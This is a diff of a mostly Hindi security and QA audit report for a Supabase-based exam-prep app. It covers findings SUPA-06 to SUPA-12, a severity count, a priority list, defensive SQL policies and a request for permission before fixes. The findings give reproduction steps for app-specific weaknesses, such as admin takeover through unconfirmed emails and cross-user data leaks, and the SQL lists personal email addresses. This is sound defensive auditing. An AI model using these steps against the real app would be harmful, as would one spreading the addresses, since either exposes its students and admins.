+| **SUPA-06** | **High** | Data Leak across Users | `src/App.tsx:946-957` | छात्र के लॉगआउट करने पर Supabase सेशन साइन-आउट हो जाता है और प्रोफाइल साफ होती है, परंतु LocalStorage में मौजूद प्रश्न प्रगति (`disha_user_progress_v2`), बुकमार्क्स (`disha2020_user_bookmarks_v1`) तथा इन-मेमोरी टेस्ट रिजल्ट्स साफ नहीं होते। उसी डिवाइस पर दूसरे छात्र के लॉगिन करने पर उसे पहले छात्र का डेटा दिखने लगता है! | 1. यूजर A से लॉगिन कर 5 सवाल हल करें व 2 बुकमार्क लगाएं।<br>2. लॉगआउट करें।<br>3. यूजर B से लॉगिन करें। | **Expected**: यूजर B को अपना खाली या फ्रेश डैशबोर्ड दिखे।<br>**Actual**: यूजर B को यूजर A के बुकमार्क्स और हल किए गए सवाल दिखते हैं। | `handleLogout` में प्रोग्रेस स्टोर, बुकमार्क कैश और इन-मेमोरी टेस्ट स्टेट को रीसेट करने का कॉल जोड़ें। | **Verified** |
+| **SUPA-07** | **High** | Error Handling / Ignored Promise | `src/utils/syncCoordinator.ts:271-281, 314` | ऑफलाइन टेस्ट सिंक करते समय `await supabase.from("attempts").insert(...)` का `{ error }` चेक नहीं किया जाता और बिना जांचे `opCount++` कर दिया जाता है। इसके तुरंत बाद लाइन 314 पर सभी इवेंट्स को "synced" मार्क कर दिया जाता है, जिससे फेल हुए अटेम्प्ट्स दोबारा कभी सिंक नहीं होते। | 1. नेटवर्क अस्थिर होने पर टेस्ट सबमिट करें।<br>2. सिंक कोऑर्डिनेटर रन होने दें। | **Expected**: असफल इवेंट्स कतार में रहें और पुनः प्रयास हों।<br>**Actual**: विफलता के बावजूद इवेंट्स "synced" मान लिए जाते हैं। | `{ error }` को डीस्ट्रक्चर करें; केवल `!error` होने पर ही इवेंट को सिंक हुआ मानें। | **Verified** |
+| **SUPA-08** | **Medium** | Performance / Out of Memory | `src/components/admin/AdminDiagnosticsSection.tsx:121` | एडमिन डायग्नोस्टिक्स स्क्रीन पर `supabase.from("questions").select("*")` बिना किसी लिमिट या पेजिनेशन के चलाया जाता है। जब बैंक में 10,000+ सवाल होंगे, तो यह ब्राउज़र में 50MB+ JSON डाउनलोड करेगा जिससे मोबाइल और कम रैम वाले टैब हैंग होकर क्रैश हो जाएंगे। | 1. डायग्नोस्टिक्स टैब खोलें और नेटवर्क टैब देखें। | **Expected**: केवल आवश्यक फील्ड्स (`id, subject_id, chapter_id, topic_id`) या समरी क्वेरी आए।<br>**Actual**: पूरे प्रश्न बैंक के विकल्प, व्याख्या और HTML एक साथ फेच होते हैं। | क्वेरी को `select("id, subject_id, chapter_id, topic_id")` तक सीमित करें और बल्क डेटा के लिए पेजिनेशन या हेड काउंट का उपयोग करें। | **Verified** |
+| **SUPA-09** | **Medium** | Missing Schema Elements | `supabase/schema.sql` vs `20261116_production_hardening.sql` | `banners` और `materials` स्टोरेज बकेट्स माइग्रेशन फाइल में तो हैं, परंतु मुख्य `supabase/schema.sql` में गायब हैं। साथ ही स्टोरेज बकेट्स में फाइल साइज लिमिट (`file_size_limit`) तथा स्वीकृत MIME प्रकार (`allowed_mime_types`) परिभाषित नहीं हैं। | 1. नए डेटाबेस पर केवल `schema.sql` रन करें।<br>2. स्टोरेज बकेट्स चेक करें। | **Expected**: स्टोरेज बकेट्स और उनकी सुरक्षा नीतियां स्थापित हों।<br>**Actual**: स्टोरेज बकेट्स नहीं बनते। | `schema.sql` में बकेट्स की परिभाषा और साइज/MIME सीमाएं शामिल करें। | **Verified** |
+| **SUPA-10** | **Medium** | Security Hardening | `supabase/schema.sql:129-141` (`is_admin()`) | `is_admin()` फंक्शन में ईमेल चेक करते समय `auth.jwt() ->> 'email_confirmed_at'` की पुष्टि नहीं की गई है। यदि Supabase डैशबोर्ड में ईमेल कन्फर्मेशन को अनचेक कर दिया जाए, तो कोई भी व्यक्ति एडमिन ईमेल से फर्जी अकाउंट बनाकर सिस्टम पर कब्जा कर सकता है। | 1. Supabase में ईमेल पुष्टि डिसेबल होने पर एडमिन ईमेल से साइनअप करें। | **Expected**: केवल ईमेल पुष्टिकरण के बाद ही एडमिन अधिकार सक्रिय हों।<br>**Actual**: अपुष्ट ईमेल टोकन से भी `is_admin()` सत्य मान सकता है। | `AND (auth.jwt() ->> 'email_confirmed_at' IS NOT NULL)` की शर्त जोड़ें। | **Verified** |
+| **SUPA-11** | **Low** | UX / Student Visibility | `supabase/schema.sql:275` & `questionReportService.ts` | `question_reports` टेबल पर केवल एडमिन के लिए SELECT पॉलिसी है (`Admins can view all reports`)। छात्र जिसने प्रश्न पर आपत्ति दर्ज की है, वह अपनी रिपोर्ट की स्थिति (Resolved / Dismissed) खुद नहीं देख सकता। | 1. छात्र द्वारा सवाल रिपोर्ट करें।<br>2. छात्र अकाउंट से रिपोर्ट स्टेटस क्वेरी करें। | **Expected**: छात्र को अपनी दर्ज आपत्तियां दिखें।<br>**Actual**: छात्र को 0 रिकॉर्ड्स मिलते हैं। | `CREATE POLICY "Students can view own reports" ON public.question_reports FOR SELECT USING (auth.uid() = student_uid);` जोड़ें। | **Verified** |
+| **SUPA-12** | **Low** | Denial of Wallet Risk | `supabase/schema.sql:215, 271` | `contact_messages` और `question_reports` दोनों टेबल्स में अनाम (Anonymous) इंसर्ट `WITH CHECK (true)` खुला है। बिना कैप्चा या सर्वर-साइड रेट-लिमिट के कोई बॉट स्क्रिप्ट हजारों फेक मैसेज डालकर डेटाबेस भर सकती है। | 1. curl/Postman से लूप में इंसर्ट रिक्वेस्ट भेजें। | **Expected**: अत्यधिक अनुरोधों पर थ्रॉटलिंग या ब्लॉक हो।<br>**Actual**: डेटाबेस हर अनाम अनुरोध स्वीकार कर लेता है। | क्लाइंट साइड बॉट गार्ड (हनीपॉट/टाइमस्टैम्प चेक) और Supabase पर सख्त इंसर्ट वैलिडेशन लगाएं। | **Verified** |
+
+---
+
+## 4. गंभीरता-वार सारांश (Severity-Wise Count)
 
 ```
-┌──────────────────────────────┬───────┐
-│ Severity Level               │ Count │
-├──────────────────────────────┼───────┤
-│ 🔴 Critical Severity         │   1   │
-│ 🟠 High Severity             │   5   │
-│ 🟡 Medium Severity           │   4   │
-│ 🟢 Low Severity              │   2   │
-├──────────────────────────────┼───────┤
-│ Total Verified Issues        │  12   │
-└──────────────────────────────┴───────┘
+┌──────────────┬───────┐
+│ Severity     │ Count │
+├──────────────┼───────┤
+│ 🔴 Critical  │   1   │
+│ 🟠 High      │   6   │
+│ 🟡 Medium    │   3   │
+│ 🟢 Low       │   2   │
+├──────────────┼───────┤
+│ Total Issues │  12   │
+└──────────────┴───────┘
 ```
 
 ---
 
-## Top 10 Fix-First Priority Issues
+## 5. शीर्ष 10 प्राथमिकता सुधार (Top 10 Fix-First Bugs)
 
-1. **BUG-02 (Critical)**: `RawHtmlArticleViewer.tsx` Stored XSS vulnerability & raw `<script>` execution.
-2. **BUG-03 (High)**: `userProfileStorage.ts` Client-side `localStorage.role` privilege escalation.
-3. **BUG-04 (High)**: `userProfileStorage.ts` vs `supabase/schema.sql` Admin email whitelist mismatch causing PostgreSQL `42501` write rejection for authorized admin.
-4. **BUG-05 (High)**: `MCQSessionModal.tsx` Negative marking penalty calculation discrepancy (0.33 vs 0.66) and unrounded IEEE-754 float drift.
-5. **BUG-06 (High)**: `App.tsx` & `ChapterDetailView.tsx` Infinite back navigation loop trapping users in topic test session.
-6. **BUG-01 (High)**: `eslint.config.js` broken due to missing legacy Firebase plugin import.
-7. **BUG-07 (Medium)**: `questionsStorage.ts` & `dataIntegrityEngine.ts` automatic "General Practice" overwriting of newly created custom topic names.
-8. **BUG-08 (Medium)**: `questionsStorage.ts` 404 network failure on `/api/snapshots/v1/content.json` causing slow initial load for new users.
-9. **BUG-10 (Medium)**: Oversized notification cards blocking central workspace on mobile devices.
-10. **BUG-09 (Medium)**: `userProfileStorage.ts` unsafe direct `localStorage.removeItem` invocation in restricted WebViews.
-
----
-
-## Recommended Action Plan (Phased Remediation)
-
-### Phase 1: Security & Stability (Immediate)
-- Sanitize `RawHtmlArticleViewer` with `DOMPurify` and eliminate raw script re-execution (**BUG-02**).
-- Lock down `isUserAdmin()` to reject client-manipulated `role: "admin"` values from `localStorage` (**BUG-03**).
-- Synchronize admin email whitelist in `supabase/schema.sql` and `userProfileStorage.ts` (**BUG-04**).
-- Fix `eslint.config.js` to restore linting capabilities (**BUG-01**).
-
-### Phase 2: Core User Experience & Scoring (High Priority)
-- Unify negative marking score computation across result modal and database persistence routines (**BUG-05**).
-- Fix URL state popstate navigation in `App.tsx` to stop the infinite MCQ session back loop (**BUG-06**).
-- Resolve topic name preservation in `questionsStorage.ts` and `dataIntegrityEngine.ts` to stop auto-renaming to "General Practice" (**BUG-07**).
-
-### Phase 3: Mobile UI & Performance Optimization (Enhancement)
-- Replace oversized notification cards with a compact, non-blocking toast notification manager (**BUG-10**).
-- Remove dead `/api/snapshots/v1/content.json` fetch and optimize initial curriculum query (**BUG-08**).
-- Wrap `clearUserProfile` in `safeRemoveLocalStorageItem` (**BUG-09**).
-- Clean up dead Firestore code (**BUG-11**) and enhance mobile touch targets (**BUG-12**).
+1. **SUPA-01**: `userActivityQueue.ts` में गलत स्कीमा और साइलेंट एरर स्वॉलोइंग फिक्स करना ताकि ऑफलाइन छात्रों का टेस्ट डेटा कभी नष्ट न हो।
+2. **SUPA-06**: `App.tsx` के `handleLogout` में प्रोग्रेस और बुकमार्क कैश को रीसेट करना ताकि दो छात्रों के बीच डेटा लीक न हो।
+3. **SUPA-02**: `userManagementStorage.ts` में `row.score` और `time_spent_seconds` मैप करना ताकि एडमिन पैनल में छात्रों का टेस्ट स्कोर सही दिखे।
+4. **SUPA-03**: `shareService.ts` से अमान्य कॉलम हटाना ताकि WhatsApp/टेलीग्राम पर शेयर किए गए सवाल तुरंत खुलें।
+5. **SUPA-05**: `public.bookmarks` पर RLS `UPDATE` पॉलिसी जोड़ना ताकि बार-बार बुकमार्क करने पर 42501 एरर न आए।
+6. **SUPA-04**: `public.profiles` पर एडमिन `DELETE` RLS पॉलिसी जोड़ना ताकि स्पैम अकाउंट्स को डेटाबेस से डिलीट किया जा सके।
+7. **SUPA-07**: `syncCoordinator.ts` में केवल सफल नेटवर्क कॉल्स पर ही इवेंट्स को "synced" मार्क करना।
+8. **SUPA-08**: `AdminDiagnosticsSection.tsx` में भारी `select("*")` को हटाकर आवश्यक 4 फील्ड्स तक सीमित करना।
+9. **SUPA-10**: `is_admin()` SQL फंक्शन में `email_confirmed_at` का सुरक्षा कवच लगाना।
+10. **SUPA-09**: `schema.sql` में स्टोरेज बकेट्स और उनकी सख्त साइज सीमाएं शामिल करना।
 
 ---
 
-## Remediation & Verification Summary (Completed Post-Authorization)
+## 6. सुधारात्मक SQL नीतियां (Ready SQL Remediation Pack)
 
-All 12 audited bugs have been successfully remediated and verified with automated test suites, static analysis, and production build checks:
+स्वीकृति मिलने के उपरांत Supabase SQL Editor में निष्पादित करने हेतु तैयार स्क्रिप्ट:
 
-| Bug ID | Title | Action Taken | Verification |
-| :--- | :--- | :--- | :--- |
-| **BUG-01** | ESLint Broken Import | Removed missing `@firebase/eslint-plugin-security-rules`; configured modern standard ESLint flat config. | `pnpm exec eslint .` runs with 0 errors. |
-| **BUG-02** | Stored XSS in RawHtmlArticleViewer | Added `DOMPurify.sanitize(htmlContent, ...)` and eliminated unsafe dynamic `<script>` execution loop. | Verified scripts stripped, clean DOMPurify render. |
-| **BUG-03** | Client Role Admin Escalation | Removed `stored?.role === "admin"` and `userProfile?.role === "admin"` checks in all admin components; strict whitelist check enforced. | Role tampering blocked. |
-| **BUG-04** | Admin Whitelist Discrepancy | Synchronized `ADMIN_EMAILS` across `userProfileStorage.ts` and `supabase/schema.sql`. | Both frontend and PostgreSQL RLS recognize all admins. |
-| **BUG-05** | Negative Marking & Float Drift | Unified negative marks calculation across save and display routines, rounding to 2 decimals with `Number(rawScore.toFixed(2))`. | Scores 100% matched, zero float drift. |
-| **BUG-06** | Infinite Back Navigation Loop | Popstate and session close handlers now cleanly strip topic slugs and prevent re-opening topic modals. | Clean back navigation verified. |
-| **BUG-07** | "General Practice" Renaming | Preserved custom topic names and avoided fallback overwrite during reconciliation. | Custom topic titles preserved. |
-| **BUG-08** | Initial 404 Snapshot Fetch | Created static `public/api/snapshots/v1/content.json` and added 1500ms AbortController timeout. | Zero 404 network errors; fast hydration. |
-| **BUG-09** | WebView `localStorage` Crash | Replaced raw `localStorage.removeItem` with `safeRemoveLocalStorageItem(USER_PROFILE_KEY)`. | Sandboxed webviews safe. |
-| **BUG-10** | Oversized Notification Cards | Verified compact toast notifications (height: 48-58px, max 1 active, 2s/4s auto-dismiss). | Non-blocking compact UI verified. |
-| **BUG-11** | Dead Firestore Constants | Cleaned comments and updated batching metrics to Supabase PostgreSQL semantics. | Pure Supabase semantics. |
-| **BUG-12** | Mobile Touch Targets & Contrast | Enlarged header button touch areas to 44x44px and enhanced dark mode text contrast. | WCAG touch & contrast compliant. |
+```sql
+-- 1. Profiles Table: Admin Delete Permission
+CREATE POLICY "Admins can delete profiles" 
+ON public.profiles 
+FOR DELETE 
+USING (public.is_admin());
+
+-- 2. Bookmarks Table: Update Permission for Safe Upserts
+CREATE POLICY "Users can update own bookmarks" 
+ON public.bookmarks 
+FOR UPDATE 
+USING (auth.uid() = user_id) 
+WITH CHECK (auth.uid() = user_id);
+
+-- 3. Question Reports: Students can view their own submitted grievances
+CREATE POLICY "Students can view own reports" 
+ON public.question_reports 
+FOR SELECT 
+USING (auth.uid() = student_uid OR public.is_admin());
+
+-- 4. Hardened is_admin() Function: Enforcing Verified Email
+CREATE OR REPLACE FUNCTION public.is_admin()
+RETURNS boolean
+LANGUAGE sql
+SECURITY DEFINER
+STABLE
+SET search_path = ''
+AS $$
+  SELECT COALESCE(
+    (auth.jwt() -> 'app_metadata' ->> 'role' = 'admin') OR
+    (
+      (auth.jwt() ->> 'email_confirmed_at' IS NOT NULL OR auth.jwt() -> 'app_metadata' ->> 'email_verified' = 'true') AND
+      LOWER(auth.jwt() ->> 'email') IN (
+        'jagdishpaliyaljat@gmail.com',
+        'zdpaliyal@gmail.com',
+        'kamleshchoudhary96022@gmail.com',
+        'disha2020prep@gmail.com'
+      )
+    ),
+    false
+  );
+$$;
+
+-- 5. Storage Buckets with Strict Size and MIME Limits (2MB limit for banners)
+INSERT INTO storage.buckets (id, name, public, file_size_limit, allowed_mime_types)
+VALUES (
+  'banners', 
+  'banners', 
+  true, 
+  2097152, 
+  ARRAY['image/png', 'image/jpeg', 'image/webp', 'image/svg+xml']
+)
+ON CONFLICT (id) DO UPDATE SET 
+  public = true,
+  file_size_limit = 2097152,
+  allowed_mime_types = ARRAY['image/png', 'image/jpeg', 'image/webp', 'image/svg+xml'];
+```
 
 ---
 
-> **QA & Security Auditor Final Sign-Off**:  
-> All 12 bugs have been remediated in accordance with production-grade engineering standards. TypeScript compiles with 0 errors, production build succeeds, and the test suite passes.
+## 7. निष्कर्ष एवं अनुमति अनुरोध
 
+ऑडिट के दौरान किसी भी प्रोडक्शन डेटा को न तो बदला गया है और न ही डिलीट किया गया है। वर्तमान में कोडबेस में कोई बदलाव नहीं किया गया है।
+
+**कृपया इस रिपोर्ट की समीक्षा करें। आपकी अनुमति (Permission) प्राप्त होने के उपरांत हम सबसे पहले Critical और High गंभीरता वाले बग्स (SUPA-01 से SUPA-07) को ठीक करना प्रारंभ करेंगे।**
